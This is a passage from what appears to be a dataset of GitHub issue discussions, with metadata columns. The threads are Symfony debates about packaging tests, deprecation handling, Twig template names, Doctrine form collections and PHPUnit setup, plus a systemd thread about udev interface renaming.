workflow of looking at tests to know how the code behaves and how it should be used"". You can grow the list of pro and contra arguments, the truth is that everyone is right this is a matter of personal preference. In this situation, we, as the Symfony project, can have two attitudes we can forcibly decide for others, or we can empower people in allowing both way of things. Given the history of this very topic, and the presented arguments at both sides, I'm now convinced that we should not enforce what would be otherwise a subjective and controversial ""best way"". So the question for me is now which choice allows both practices to coexist? The first aspect is the if we always ship the tests as we do today, 2. is allowed, and 1. is just one IDE configuration or cleaning script away. Moving tests out of each components folder breaks 2. for subtree splits. Looks like a no-go. Now moving tests out of archives since we install code through composer, we could use --prefer-dist for 1. and --prefer-source for 2. But this ignores one practical and fundamental difference --prefer-source is slow as hell. --prefer-dist has one ZIP to download, and then has local caching, which means it's fast, very fast. --prefer-source has to  and isn't cached as of now. Nobody can't possibly accept to loose so many time because ""hey, 2. is your choice, haha"". So, my point is that in practice, this has the same effect as not shipping the tests at all. No-go again.  In conclusion I'm all for the status quo, which is the best solution, unless --prefer-source can be made as fast as --prefer-dist (or any other way that would make fetching the tests as fast, see e.g. my email to github support). Meanwhile, I'm all for enhancing editorconfig or any other way to help 1. supporters configure their IDE or clean their filesystem.  How many people actually spend time diving into tests and trying to understand them (which is usually more complicated than looking at the code)? If people really want to see the tests while they are developing they can choose already . If this is too slow for them, they can also view the files on github. By packaging the tests, people who don't use them or don't need them (My guess is 90%+) still get them. This is extra bandwidth, extra actions during deployment and extra effort in the IDE. If people really, really want to run the tests, they should make a clone (or grab the zip from github) and run it in there with their  dependencies. When the package comes from Packagist it should not include test files for the simple reason that most people won't even need them and should follow one of the above steps for a better workflow in the first place. In my eyes this would mean  Leaving the repository as is for github Adding composer excludes for packaging   @friend no, it's not a matter of personal preference. There are situations where you can do everything, but it's better to do only one thing (like putting your sources outside the  folder). There are two environments with different needs, dev &amp; prod, but we have to face the problems in the order of priority, so let's discuss prod before dev. In production we have two topics security and performance. NOT having additional files will always improve both. Security the only code that can't be broken, or can't broke something else, is the one that there isn't. Performance less code, less resources, less timings. The  already present it's good, but not enough. I am sad that you closed your  about  I highly hope that to be merged. Once the production is faced, only then we can discuss about development, and whether or not including additional informations (like tests) in a dev setup.  @friend any consideration about my previous thought and reopening  No way for me I won't take the lead on this topic...  What about this solution for the problem?  Just out of interest, why does symfony recommend that the tests are in the root of a project but do not do this in symfony/symfony? I understand that there would be issues with the subtree split, but i’m sure something could be worked out? I’m not trying to force a change here but just understand the reasoning so I can work out my own best practice. Having the tests together in root seems like a logical and friendly solution. However symfony moved them out, does this mean the more complex projects get I would probably need to move them out too?  @friend because we want to include tests in our subtree split repositories, and for that, they need to be in the split folder.  @friend yes, as I say, I understand about that. However, as far as i recall this is some automated process (i think with split.sh) so there is probably a way around this to make it work. It just seems very strange to say ""We recommend you do it like this, but we do it differently"". If symfony/symfony immediately hit an unsolveable problem with this structure, perhaps there is something inherently wrong?  @friend if you read official Symfony best practices, you may notice that there are different for non-reusable apps (ie your private project) than for shared packages/bundles. The recos that applies to apps are made to prevent doing things that bundle require, but are just overengineering to private apps. The same apply here. symfony/symfony is structured to reach its goals, which is not the goal of your private apps.  @friend can we close this one? From the symfony project pov, this is solved to me, it's an argumented ""no"". I understand you don't agree, but that's still ""resolved"".  @friend thanks, yes I understand that. Lots of private apps sometimes end up public / reusable tho. If this structure locks you in, or may create problems down the line, then it might not be advisable as a general standard. If there is a workaround to deal with it, mayne it would be good to standardise symfony/symfony too? Please dont think i am trolling you or trying to cause an problem here 😄. That is really not my intention and I am very grateful for all the hard work and though you guys put in 👍. I am just attempting to gain understanding and maybe offer perspective. Perhaps the solution is a mutually agreeable one? Perhaps there is a solution but ""it just isn't worth it"". Resistance to change without consideration can lead to unfortunate situations in the future. Perhaps this issue is just not high prio or maybe the discussion should be taken elsewhere?  symfony/symfony is a meta project the project levels are the subtree splits. At the project level, tests are at the root. That's what @friend mentioned also.  I think this issue of symfony/symfony root vs package root will become a lot less once flex is released.  @friend that makes it clearer to see it as a ""meta"" project. A bit strange that work is done on the meta project but i guess that is thats a side affect of the monolithic project approach. Definitely makes sense in this case tho, so thank you. @friend could you point me in the right direction for info on flex?  @friend there's no public info on ""Symfony Flex"" project yet. It will be released ""soon"" and it will be a new way to install/manage Symfony applications in a ""composable"" way.  @friend This was only announced during the SymfonyCon keynote for now, and the video is not yet available AFAIK.  Great, I will keep a look out for it. Thanks for the info everyone 👍 ",62,4,409,0,0,231,14,
symfony/symfony/27936,0.09421410250000001,symfony,symfony,RFC: change deprecation error handler to use weak_vendors mode by default,5237,49,43,0,4,"This RFC was prompted by the recent deprecations in various Doctrine projects, which now make some peoples' tests fail (example  For a Symfony project, the default value for the deprecation handler should be , not  - any deprecations within vendors are not within the scope of the application and thus shouldn't make tests fail. With Symfony Standard Edition being deprecated and Symfony Flex being the new Gold Standard (™️) I wasn't sure where to bring this up, so I thought I'd just ask around here. Would you be in favor for a change like that, and where would we make it?  I've always been quite skeptical with weak_vendor mode. My reasoning is that you call the vendor code, so in the end there is no such thing as vendor-only deprecations. The example here is a good one thanks to the default mode, we identified quite early that Doctrine was in ""WIP"" state. Without this early notice, it could have been left unidentified for much longer, thus fixed much later. I think the current default encourages a constructive open-source attitude instead of having a ""not my fault"" attitude, it encourages ppl to own their vendor. That also works on Symfony since we decided to build on top of Doctrine, we own a responsibility here also and keeping eyes actively open on the project is vital for the ecosystem.  Can you please explain what exactly was WIP there? Two new silent () deprecations appeared in dev version, for two classes deprecated ~6 years ago, and some more using phpDoc annotation . Although I agree that in the ideal situation the usage of deprecated classes shouldn't have existed by the time, I disagree with your actions regarding #27609 (the revert + discussion) where you discarded the work solely because of not-yet-migrated usage coming from a yet another development version. Yes. And everything would work as before. It's not a bug, using deprecated API doesn't inherently break anything and the deprecated API stays in place until end of minor version (semver-compatible approach). This is not relevant to whether  is / should be default or not, you can opt in for such behavior regardless. The deprecations using  are called opt-in, but with your assumptions, you are actually making opt-in deprecations opt-out. Sadly this completely breaks the original concept of _opt-in_ness - these deprecations are no longer opt-in since you force everyone to opt-in and comply. In the end what you are saying is in contradiction with Symfony's converntions I agree it's everyone's responsibility to keep an eye on the vital state of their dependencies. I agree it's a common interest to forward any breakages / incompatibilities / bugs to the maintainers of the dependencies in question as soon as discovered. I do not agree that silent/phpDoc deprecations should be something covered by any of these. Which brings me back to ♠@friend_vendors`, there is still a notice for deprecations happening in vendors.)  @friend usage of the listener reporting deprecation and making tests fail for them is the opting in. This listener is optional, and deprecations are not making the testsuite fail if you don't have it.  Is it really though? Only having the package installed seems it gets enabled automagically in the report everything mode  installed it in a project without previously having the bridge (try yourself on doctrine/orm2.6 for example), didn't change phpunit.xml at all, but  suddenly ends with exit code 1 and summary of deprecations. ♠composer create-project symfony/website-skeletonsymfony/phpunit-bridge` automatically. This is not opt-in.  This should be considered on the recipe for the bridge I suppose.  There should absolutely be no such thing, but unfortunately, it turns out people make mistake, and both the caller and the callee (which triggers) will be in the same Composer package.  was made to help libraries avoid that kind of mistake, which results in ""unfixable deprecations"".  As I understand, the only way to silence these errors is to use an environment var , but I have opened as issue as this still doesn't silence them as it appears that during simple phpunit bootstrap, getenv is not able to access the  vars -  I was not sure what  meant, but now that I checked the code and chatted a but with @friend, I pretty confident we should not do this  ignores any deprecations thrown by any vendor; it keeps only deprecations thrown by your own . That's not something apps should do. For libs, it may make sense of course. For this reason, I'd be -1.  After a constructive discussion on Slack with @friend, I updated my understanding of the topic. What want here is that their CI don't fail on deprecations. While this lowers the urge to contribute fixes to vendors that trigger their deprecations, this may be more compatible with daily job tasks. So here we are  doesn't use  because this mode is meant for libs. Instead it uses a maximum number of deprecations. But the end result is similar the CI won't fail by default, but the deprecation summary will still be printed.  I believe the solution implemented now is a good compromise. People can still complain about the deprecations or (ideally) fix them upstream without the deprecations disrupting their daily workflow. Thanks @friend! ",23,7,165,0,0,92,4,
symfony/symfony/3150,0.0824639115,symfony,symfony,[Templating] - Unable to find template,11091,105,72,0,3,"Unable to find template ""global_right.html"" expected to work, but fails     {% include 'global_right.html' %}    expected to work, but fails     {% include 'global_right.html' %}    this works finally     {% include 'global_right.html.twig' %}    - I assume that this is because of how Symfony2 integrates twig, because twig documentations documents an expeted behaviour  should not enforce the .twig extension - or at least, the error messages should be more concise.  This is because Sf2 supports multiple engines (and this is not related to Twig itself) The templating engine to use is selected by the last part i.e.  @friend the include tag expect a template name. When using Twig standalone, the template name is generally directly the file name (and so can be virtually anything). The loader used in Symfony2 enforces a specific format to integrate templating with the bundle structure  @friend ""The loader used in Symfony2 enforces...""  That's the point. It should not force me to avoid the most natural thing within development inclusions. And if it does so, then it must bring up more concise error messages. It says ""Unable to find template""  which is missleading (if not wrong, the template is there). It should say ""File not allowed, twig is configured to load only ... ...! Try this and that, or change configuration in ... ""  Can I change the configuration somewhere, thus I can include a simple ""MyTrivial.html"", too?  @friend the issue is where would a template named MyTrivial.html be found ? And the error Unable to find template comes from Twig. And it is right. The template with this name does not exist. And the name of the template is not the same thing that the name of the file in which you store it (it does not even need to be stored in a file. You could write a Twig loader loading templates from a database)  Ok, I'm new to Symfony2. But I'm a 20+ years developer with experience in hardware-design, and thus not new to complex system / framework design. You are familiar with Symfony2, and that's exactly the reason why you don't see the obvious flaws in it. ""include"" is a known construct, with known functionality and behavior  (see e.g. apache SSI, or xiinclude for the web-domain). MyTrivial.html would be found in the same directory like the template including it. If you change this (commonly known) ""include"" behavior in Symfony2, then you should change all related information, including error messages. But as I'm mainly interested to go on, my main question is Can I change the configuration somewhere, thus I can include a simple ""MyTrivial.html"", too? If not, which would be the easiest way add such functionality via code?  @friend even when using Twig standalone with its FilesystemLoader, include would not load a template from the current directory but relative to the path configured in the loader (which is how the name of templates is build in this loader). Symfony2 is not changing the meaning of the Twig include tag at all. It simply has a different way to name the template. The Twig environment does not know at all where the template is stored. Templates are always referenced by name.  Well, I guess then that Symfony2 is just doing perfect, and users just want the wrong things.  I guess I'll stop to try to enhance the product (Symfony2) and will simply start to silently implement my things locally. Seems like a twig extension is the way to go.  Well, I think there should really be a possibility to include raw HTML in core (i.e. without engine).  Symfony2 Standard Edition is the whole stack of Symfony2 components combined in such a way to enable creation of MVC apps (correct me if I'm wrong) with some extras added such as TWIG engine for templates/views, Doctrine2 for models and some other bundles/libs. I don't see where in the core you could be using HTML and for what. Also since you're suggesting to add .html files support, why not allow for .php.inc, .inc.php, .htm and so on inclusions. Please correct me if I'm wrong. As for the original problem, I believe both @friend and @friend did a great job on explaining how things work in Sf2. So instead of improving the framework for you only, just submit a PR with a template engine that is able to load .html files directly so that everyone can benefit from your work just as well as you can benefit from the work of the others. If it should not be merged then just make a bundle out of it and publish it ) And if you don't like the error message thrown, just submit a issue report for it or, even better, a PR with an enhanced message.  well, the point is that Twig could be able to include an HTML file using {% include %} it is a valid Twig template (without any logic in it at all). But it needs to have a name able to be handled by the loader registered in Twig. As a template name needs to be unique (it is the identifier to find the template), Symfony2 use a naming scheme which includes the bundle name to avoid collisions. And as it supports using several engines, it uses the extension to find the appropriate engine when rendering the template and so enforces such naming (the extension is used to find the engine so Twig templates needs to end with .twig). @friend regarding including .inc.php files in the templates, it makes no sense at all. It would kill totally the fact that Twig does not allow running arbitrary PHP code.  What about an exception in the template name parser if the name isnt correct? Ran into this issue when using twig to render templates for emails.  @friend this would make the loader unusable within a ChainLoader. The error message in Twig could probably be improved though to mention that it searches the template by name.  @friend it actually does but then uses a regular Twig loader to look for the file. @friend this means that what you are looking for is possible out of the box. You have to create a template loader service (i.e. ), add the paths (by calling ) and configure the templating system to use this loader.  @friend thank you for the hint. This is peanuts for me, but far to complex for a simple user. And I ""emulate"" many times a simple user, because I'm simply to ""lazy"" to make such effort where a simple config option would do the work. That's why I use a framework to reduce effort. Now, the main thing here is the core developers should listen to the user expectations, thus the default behavior is near-to-user-expectations. I understand the technical limitations, but there are possible solutions a) Clarify the error message to something like ""please use template name, e.g. ""page.html.twig"" or ""YourBundlepage.html.twig"" and ensure it has valid extension which referes to the template engine (.twig, ...)"". b) Provide a configuration option ""allow_raw_includes"", which handles unspecified templates (.html) c) Provide a construct like this {% include file='global_right.html' %}  d) Provide a construct like this {% include_raw 'global_right.html' %}  Which directions (a/b/c/d) would be the most possible to be accepted for inclusion into the main code?  @friend The error message is thrown by Twig. So it cannot include stuff related only to the Symfony2 loader (other loaders will have different patterns for valid template names) And loading a file relatively to the current template location would require changing totally the way Twig works (removing most of the possibilities for the loader) as currently a template itself never knows where it is stored (not even if it is stored in a file, or stored at all as there is a StringLoader btw). So you cannot find something relatively to this location.  Let's clarify this issue (look at the FileSytemLoader) When you try use a template which name pattern differs from  then you will fallback to the Twig Loader. So as of today the error message is not so bad it assumes you are not using the symfony syntax so it only print that the file could not be found. May be there is a little room for improvement by adding more precision to the error message, something like ""Either you have specified an invalid template name or the template can not be found"".  @friend, can you please for one moment stop thinking that there are no other developers which can overcome those (peanuts-) issues? There are people capable of seeing solutions and paths where you just see problems and barriers. And of course there's another thing we're not talking about a control-software for a nuclear plant. It's a simple framework. So, hypothetically, which directions (a/b/c/d) would be the most possible to be accepted for inclusion into the main code? (if they overcome any possible problems you mention).  @friend - you take existent code as a foundation to analyze the issue. I take user expectations as a foundation, and really don't care about the code. I've enough with this error message. To be blunt it's crap!  I see no issue - at least not in the framework.  You're not the only one who does not see the issue / issues. And that's in essence the main issue. Hopefully I get at least the hypothetical answer, thus I can go on.  @friend well the problem with your expectations is that you want a ""do as i think"" system. in order to provide what you need, we would need to simply the out of the box possibilities. aka if we dumb the system down, we could figure out what you want. but as with the current flexibility you could have any number of possibilities. as noted however there are two solutions that could move things closer to your desired behavior 1) add handling for ""raw html"" to twig 2) add a ""raw html"" template engine option to the framework bundle finally some advice to you work on your attitude.  @friend My attitude? The only attitude which has to change is this of the Symfony2 team agianst the userbase. Sorry, users (especially the one who contacted me in privat), as you see I'm forced to do development locally.  @friend lsmith77 told you how to add support for your feature. Now you you could implement it and share your work with the community via PR. No need to rant.  @friend could you please come down ) The system is flexible and implemented this way to support more than one templating engine. If we where to do what you want, the system would not be flexible enough to support Smarty or any other engine. As several of other members of the community have stated here, it is possible for you to implement the  twig tag yourself and even share it with the world through a bundle. There is nothing that forces you to develop this locally especially if other will benefit from it. Lastly. I aswell must advice your to adjust your attitude. Symfony2 is FREE and developed by people mostly in their sparetime. Some of us are lucky enough to work with it in our day to day life but that is far from true for all. Have a nice day!  @friend once more implementing it is peanuts, that it get's into the code is another thing. The team usually ignores PR's, even issues subjecting defects in coding-standards  get serious, please. At least all other people have spared me this typical Open-Source whining thing.  closing as a duplicate of #3696 ",50,0,428,0,0,212,12,
symfony/symfony/3201,0.049413045999999995,symfony,symfony,One to many relationship doesn't behave as expected when using collections in forms,7670,73,50,0,5,"When using entity's in Doctrine with one-many relationships using a form collection, Symfony does not assign the parent entity to the child entity. Using 'by_reference' =&gt; false with cascade-persist fails and the child entity's foreign key is null in the database. The following appears to remedy the issue within the set method which accepts an ArrayCollection within the entity. Surely Symfony should do this within bindRequest in the form itself?  The form component does not know anything about Doctrine, which has a requirement to update the owning side of the relation. Btw, if you don't set the hub when adding a link, it will always fail to add it. This is why it is recommended to do -&gt;setHub() in the setter of the inversed side. This is a Doctrine requirement which is documented in the doctrine doc about relations. altering the Symfony form component for such cases is wrong as it would couple it to Doctrine (to be able to detect inversed-side of relations) Btw, this requirement is one of the reason why the code generated by the EntityGenerator should be considered as a starting point for the entities, not as a ready-to-be-used-blindly code.  Hey Christophe, I'm aware of the need to set the hub in Doctrine as I've used it outside of Symfony, however the documentation doesn't make it clear that you need to do this. The assumption is (based on the Symfony documentation) that you do not need to set the the owning side of the relationship explicitly and that Symfony will handle this for you... I would be happy to update this for you to avoid confusion to new Symfony developers.  Where does the Symfony2 doc tell you that it does some magic to allow you not to do stuff required by Doctrine in its documentation ? If it really says this, we need to change the doc.  It doesn't, that's my point. Someone new to Symfony like me will assume that Symfony will handle all of this... as the documentation doesn't explain how Symfony and Doctrine handle this. from -  in the sample code in the cookbook, it doesn't mention that what you have to do to associate a tag with a task in order to persist it in Doctrine...  The data are indeed transferred to the underlying object (check your hub object you were editing and it will have the links) But your underlying object is the inversed side of a relation so Doctrine does not track changes in it. the cookbook you linked explicitly talks about a ManyToMany relation, and in this case, the collection can be the owning side.  I did, and it does send an ArrayCollection to the setLinks method. My problem is that Symfony only does half of the work and doesn't handle associating those links with the Hub by calling setHub($hub) on each Link that Symfony processes when the form is submitted. This results in a NULL value being inserted into the Links table for the hub_id. This now means that you have to explicitly add the association within the Doctrine Link entity by looping over each Link in the ArrayCollection passed to the setLinks method. I think this documentation clearly needs to be updated, if you read through the code, it's clear that this is a OneToMany relationship as getTasks and setTasks aren't even in the Tag entity. It's worth noting that this happens within our application and a vanilla install of Symfony, the same issue can be found here  however the solution doesn't seem to work for the current distro of Symfony  Well, of course it does not call it. You are editing the Hub object in your form, and telling the Form component to access a links property (which is done using getLinks and setLinks). why should the form component assume that it it should do an inversed work on the objects ? It does not know how your objects works. Looping over the collection in the setLinks method is what Doctrine requires fot the inversed side. And regarding the cookbook entry, the note at the beginning *explicitly mentions a ManyToMany. And your remarks let me think you confuse what a ManyToMany relation is and what a bidirectional relation is. A ManyToMany does not need to be bidirectional. And even more, if it was a OneToMany, it would logically be the inversed side of a ManyToOne and in this case you would have to have a getTask and a setTask methods So no, it is absolutely not clear it is a OneToMany.  Well I have to apologise to you then, me and my team are obviously stupid and misreading the Symfony documentation and haven't spent the last day or two trying to figure out why the Symfony documentation is so crap and not explicit with the way in which the Form component handles associations with Doctrine, something that other PHP frameworks are quite clear on. The fact that the Cookbook itself is incomplete says a lot, and your attitude towards people looking for support is even worse. Thanks a bunch!  well, the cookbook is not incomplete. first, this one is not about Doctrine and second, Doctrine never requires using bidirectional relations everywhere  the form component does not handle anything ""with Doctrine"". It handles things with objects, whatever they are. It is totally decoupled from Doctrine. Best way to see it is to look at the code in the Symfony\Component\Form namespace there is not a single reference to code from the Doctrine namespace there.  I don't mean to argue but at the bottom of the cookbook it clearly says. No it doesn't, but any developer (including my team) will look at those entity's and tell you that's it's not clear that it's a ManyToMany association/relationship. Even so, the example code is clearly using doctrine otherwise it wouldn't have  within the entity. What's the point of confusing a reader into thinking that Doctrine is not being used for this cookbook when it's clearly used as an example. Surely it makes sense given the fact that Doctrine is the prime ORM used for Symfony to at least have a cookbook showing how to do this specifically for Doctrine?  The cookbook has been completed since, but the website is not yet regenerated.  I rest my case  I don't mean to sound out of place but...  yeah, there is an issue when you don't use by_reference = false. But even if we fix it, you will still have to implement the update of the owning side for Doctrine. The issue when updating the collection by reference currently is that it does not call the setter at all  Even with  it doesn't work. It's clear that the issue here is the fact that the documentation doesn't match up to the expected behaviour from Symfony. So the docs need to be updated and be clear about what Symfony does and does not do in the interim. This will stop developers from smashing their heads against their screens trying to figure out why the expected behaviour isn't as it should be. I'm sure other people working on time sensitive projects will agree that if we know what Symfony does and does not do with Doctrine it will save time and prevent headaches. We've moved from Zend to Symfony over here and are gradually porting our much larger projects over to Symfony. It's a great framework and we love it, but the documentation is really lacking a little which is causing us a nightmare!  well, with by_reference = false, it works when you do what Doctrine requires for its inversed side relations  again, this should be clear in the Symfony documentation, especially when it comes with Doctrine integration as standard as well as having tutorials about using Symfony with Doctrine. My problem isn't with Symfony code, it's with the lack of documentation explaining how collections in forms work and what's expected of the developer to ensure that they persist correctly.  You can get the solution in this tutorial Good Work Link ",24,6,187,0,0,187,6,
symfony/symfony/5402,0.0986350485,symfony,symfony,Cannot run test suite,6863,43,281,0,3,"➜  src  git clone git//github.com/symfony/symfony.git Cloning into 'symfony'... remote Counting objects 144068, done. remote Compressing objects 100% (44515/44515), done. remote Total 144068 (delta 91155), reused 135518 (delta 83912) Receiving objects 100% (144068/144068), 22.84 MiB | 837 KiB/s, done. Resolving deltas 100% (91155/91155), done.  ➜  src  cd symfony   ➜  symfony git(master) composer install   Installing dependencies   - Installing doctrine/common (2.3.x-dev)     Cloning 605b1b8b5a7bc8daf9111fb35483e5708e30de35    - Installing twig/twig (dev-master)     Cloning 459720ff3b74ee0c0d159277c6f2f5df89d8a4f6  Writing lock file Generating autoload files  ➜  symfony git(master) phpunit             Warning require_once(/usr/local/src/symfony/vendor/doctrine/orm/lib/Doctrine/ORM/Mapping/Driver/DoctrineAnnotations.php) failed to open stream No such file or directory in /usr/local/src/symfony/vendor/doctrine/common/lib/Doctrine/Common/Annotations/AnnotationRegistry.php on line 59  Call Stack     0.0002     274896   1. {main}() /usr/local/src/phpunit/phpunit.php0     0.0254    2845976   2. PHPUnit_TextUI_Commandmain() /usr/local/src/phpunit/phpunit.php46     0.0254    2846568   3. PHPUnit_TextUI_Command-&gt;run() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php130     0.0254    2847120   4. PHPUnit_TextUI_Command-&gt;handleArguments() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php139     0.0312    3242512   5. PHPUnit_TextUI_Command-&gt;handleBootstrap() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php615     0.0314    3252840   6. PHPUnit_Util_FileloadercheckAndLoad() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php787     0.0314    3253224   7. PHPUnit_Util_Fileloaderload() /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php77     0.0315    3260656   8. include_once('/usr/local/src/symfony/autoload.php.dist') /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php93     0.0330    3385496   9. Doctrine\Common\Annotations\AnnotationRegistryregisterFile() /usr/local/src/symfony/autoload.php.dist17   I think you need to install the composer stuff with .  you need to ask composer to install the dev dependencies too (used in the testsuite but not mandatory deps) by adding the --dev option when running the command. Btw, note that looking at the .travis.yml file allows to see what is needed to setup the testsuite (as it is the steps used to initialize it on Travis)  Information like this should not be hidden in JSON and YAML files. Now I have a different issue ➜  symfony git(master) composer install --dev    Installing dependencies from lock file Nothing to install or update Installing dev dependencies   - Installing phing/phing (2.4.12)     Downloading 100%             - Installing propel/propel1 (dev-master)     Cloning 6234fec72db2ad8fc0fe6e1ea6c1cd76abeeef5a    - Installing monolog/monolog (dev-master)     Cloning 1.2.1    - Installing doctrine/dbal (2.3.x-dev)     Cloning adb28e4e1f959d515971b8e8b7f05a01913a7b91    - Installing doctrine/orm (2.3.x-dev)     Cloning bbf527a27356414bfa9bf520f018c5cb7af67c77    - Installing doctrine/data-fixtures (v1.0.0-ALPHA2)     Downloading 100%           monolog/monolog suggests installing mlehner/gelf-php (Allow sending log messages to a GrayLog2 server) monolog/monolog suggests installing ext-amqp (Allow sending log messages to an AMQP server (1.0+ required)) monolog/monolog suggests installing ext-mongo (Allow sending log messages to a MongoDB server) doctrine/orm suggests installing symfony/yaml (If you want to use YAML Metadata Mapping Driver) Generating autoload files ➜  symfony git(master) phpunit                    Fatal error Cannot redeclare class Symfony\Component\Yaml\Tests\DumperTest in /usr/local/src/symfony/src/Symfony/Component/Yaml/Tests/DumperTest.php on line 161  Call Stack     0.0002     274984   1. {main}() /usr/local/src/phpunit/phpunit.php0     0.0757    2845976   2. PHPUnit_TextUI_Commandmain() /usr/local/src/phpunit/phpunit.php46     0.0757    2846568   3. PHPUnit_TextUI_Command-&gt;run() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php130     0.0757    2847120   4. PHPUnit_TextUI_Command-&gt;handleArguments() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php139     0.0974    3814688   5. PHPUnit_Util_Configuration-&gt;getTestSuiteConfiguration() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php666     0.0974    3816464   6. PHPUnit_Util_Configuration-&gt;getTestSuite() /usr/local/src/phpunit/PHPUnit/Util/Configuration.php771     0.5300   11648312   7. PHPUnit_Framework_TestSuite-&gt;addTestFiles() /usr/local/src/phpunit/PHPUnit/Util/Configuration.php855     6.5017  138748672   8. PHPUnit_Framework_TestSuite-&gt;addTestFile() /usr/local/src/phpunit/PHPUnit/Framework/TestSuite.php417     6.5027  138749056   9. PHPUnit_Util_FileloadercheckAndLoad() /usr/local/src/phpunit/PHPUnit/Framework/TestSuite.php356     6.5027  138749336  10. PHPUnit_Util_Fileloaderload() /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php77   This is weird. I don't find any duplicated class declaration for this test. Could it be possible that phpunit includes the file twice ?  this is not hidden  True, I did not know about  Why? Because I expect this information in a  file in the repository. Oh, well.  @friend Could you send a PR updating the README file with your expected information?  Less snark, more pull requests maybe, @friend? FWIW, I'd put this into a  file.  I do not like your attitude, @friend. What you ""demand"" already happened.  I do not like yours, either. I asked for feedback on PHPUnit 3.7RC. @friend replied mentioning an issue with Symfony. To research this issue I need to run the Symfony test suite. I ran into problems, I opened this ticket asking for help. And while others are helping ... you are attacking me for not contributing.  Right, I'm not helping, I was just the first person who told you how to install the required dependencies (here and on Twitter). All of your comments this PR are unnecessarily passive-aggressive. If you don't see that, then figure out a way to get out of your bubble until you do please.  Indeed, you helped in the beginning. Sorry that I forgot about that. I overreacted because of your ""Less snark, more pull requests maybe"" remark. At least to me, such a remark is offensive. I do not use Composer, Symfony, Travis, etc. This is why I ran into the original issue. For me it was clear from the beginning that I would send a pull request once I gathered all the information I needed, that's just what I do. If my comments came across as passive-aggressive or offended in any way my apologies.  And finally, did you find a solution for your  issue @friend ?  Yes, it was PHPUnit's fault  @friend, I see that you require a few more Symfony files there, how does that work when we want to test the Yaml component with PHPUnit, wouldn't we test the classes that are in PEAR then? ",5,0,546,0,0,417,6,
systemd/systemd/11436,0.1583250185,systemd,systemd,network interface is renamed although NAME has been set by udev rule,7424,69,39,0.6410256410256411,3,"systemd version the issue has been seen with v240 Used distribution Debian sid Downstream bug report at  reproduce the issue, create a file  containing with the mac address of your ethernet network interface. Unload the network module (in my case ), then load it again. Notice how the interface is properly renamed Now run The interface is renamed although a custom NAME has been set.  that's a regression compared to v239, and I'm inclined to add it to the v241 milestone, given that it can mean loss of network access. @friend, @friend wdyt?  after loading the kernel module After running   With v239 after modprobe after   Hmm, I wonder if this is intended effect of 55b6530baacf4658a183b15b010a8cf3483fde08  /cc @friend  Also see #9006  And of course #9088  Not sure what the right approach here is  Why it is named  when the driver is loaded?? If, the final result is  then I expect it should be always .  It should always be named  because of the udev rule.  What happens when the condition  is dropped?  @friend does that really matter? It's a udev rule that worked for years, it shouldn't suddenly stop working.  I've not tested that, but I guess that, because of the condition,  initially it is named to , as the initial name is . the later evaluation results , as the interface is not  anymore.  v239 or before, it is evaluated only once. So, the name was stayed at . But, v240, 55b6530baacf4658a183b15b010a8cf3483fde08 makes the rule is always evaluated.  I think once a custom name has been set, it shouldn't be renamed by udev again.  If I remember correctly, the original motivation of the commit is that interface name can be changed by udev rules without updating initrd or changing kernel command line. So, if my above guess is correct,,, what should we do?  imho, revert and find another solution #9006  @friend a default policy like /lib/systemd/network/99-default.link should never trump explicit user configuration.  @friend There is no split between ""explicit user configuration"" and the rest. Files like  are named this way to have the lower priority. But there is no magic of ""oh, this was set by the user, let's not touch it"" anywhere.  The problem with trying to make a division like that is that nobody seems to ever agree what is ""user"" configuration, and what is ""explicit"".  Current approach of simply executing the configuration as we find it is much clearer and sustainable. #9006 was applied precisely because users were creating configuration and were peeved that some very specific parts of that configuration are not applied. The rules in the bug report were relying on an implementation detail of the rule engine, and changing this implementation detail is something that we are allowed to do. The rule should never have had  if it was supposed to apply also after the interface was renamed. Current behaviour seems correct to me when the device is called , there's just one rule that applies to the devices, and when  fires off, we execute all rules that apply. This is also much nicer for the user, because they can create configuration and apply it, without jumping through hoops to reset the state.  It's not nicer to users, as it breaks existing user configurations. Which is bad  I'm amazed that I have to point this out....  Not every facet of program behaviour is guaranteed to be stable. Generally, only things that are documented are promised to be kept unchanged. Is the fact that link renames are applied only once documented anywhere? You seem to suggest that we should never change any user visible detail. I think this user rule was in error, and it worked for a while by luck, and now it doesn't. This happens all the time.  I guess I'll stop filing bug reports  wouldn't it make sense to only apply  matching to the kernel-assigned name, not a potentially renamed name?  This doesn't seem to have ended well.  From the peanut gallery... Would it make sense to somehow record the original name of this interface and match  against that name as well? When reading the rule from the OP, that was my impression of how that should have worked (and the previous one-rename rule was a good approximation of it...) Not really sure whether that makes sense, would be feasible and would address the other issues that commit was supposed to fix...  Urks, I find this breakage quite unfortunate I must say. I mean, writing a rule that matches effects of a previous rule (like the one debian is using there) is probably not a great idea (rules really should match stuff that is not going to change for a device, so that they are idempotent), but I am not sure that simply breaking systems like this is a good idea. I don't have a strong opinion on the way out, but I am slightly leaning towards reverting the patch and simply asking downstreams to drop any rules that rename ifaces whatsoever from their initrds, as that means the host's policy will never be enforced. I mean, afaiu the patch was done precisely to ensure that host policy applies if initrds already renamed devices, no? I mean, users/downstreams assumed that these rules where OK, and we probably should tell them they are a bad idea, but also, I think we shouldn't break so many installed systems this way... Another idea might be make it configurable in the .link file whether to rename already renamed interfaces, with a default to on. Then, change our 99-default.link file to turn off the option. This way, .link files supplied by users will by default override everything, but the fallback one we provide won't. Other ideas, opinions?  i mean, with the naming scheme cmdline option and stuff we now go into great lengths to stabilize names over releases, it would be a pity if we'd then break existing rules so galantly (even if they aren't written in particularly good style)...  The current documentation does not specify whether user modifications are read, and there are two factors suggesting they shouldn't  The name The existence of a NAME variable for matching against userspace changes.  Honestly, having a variable named KERNEL map to a value provided by userspace is weird.  Hmm, we have already documented that implicitly...  least, we need to update this.  @friend's proposal is implemented in #11443.  userspace, no renaming is performed. The available policies OK, that is enough for me to consider the previous behaviour documented. So I agree that we should preserve compatibility for this. I like this approach. The question is whether to default to ""on"" or ""off"" with current link files. If we default to ""off"", we preserve more backwards compatibility. If we default to ""on"", we get saner behaviour.  Or, how about disabling the new behavior if naming scheme is specified earlier than v240?  @friend interesting idea. Maybe like this if naming scheme is &lt; v240 we default to 